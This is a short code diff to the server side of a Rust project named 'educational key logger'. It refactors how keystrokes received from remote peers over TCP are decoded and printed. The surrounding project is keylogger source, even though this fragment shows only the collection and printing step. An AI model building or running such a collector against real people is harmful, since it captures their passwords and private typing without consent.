@@ -1,5 +1,6 @@
 use educational_key_logger::IP_PORT;
 use educational_key_logger::input::InputEvent;
+use educational_key_logger::parser::input_events_to_text;
 use std::io::{self, Read, Stdout};
 use std::net::{SocketAddr, TcpListener, TcpStream};
 use std::sync::{Arc, Mutex};
@@ -118,11 +119,12 @@ impl StreamReadHandler {
         let input_events = std::mem::take(&mut self.input_events);
         let _guard = self.stdout.lock().unwrap();
         print!("{}: ", self.peer_addr);
-        input_events.iter().for_each(|input_event| {
-            if input_event.is_key_press() {
-                print!("{}", input_event.code_as_string());
-            }
-        });
-        println!();
+        println!("{}", input_events_to_text(&input_events))
+        // input_events.iter().for_each(|input_event| {
+        //     if input_event.is_key_press() {
+        //         print!("{}", input_event.code_as_string());
+        //     }
+        // });
+        // println!();
     }
 }
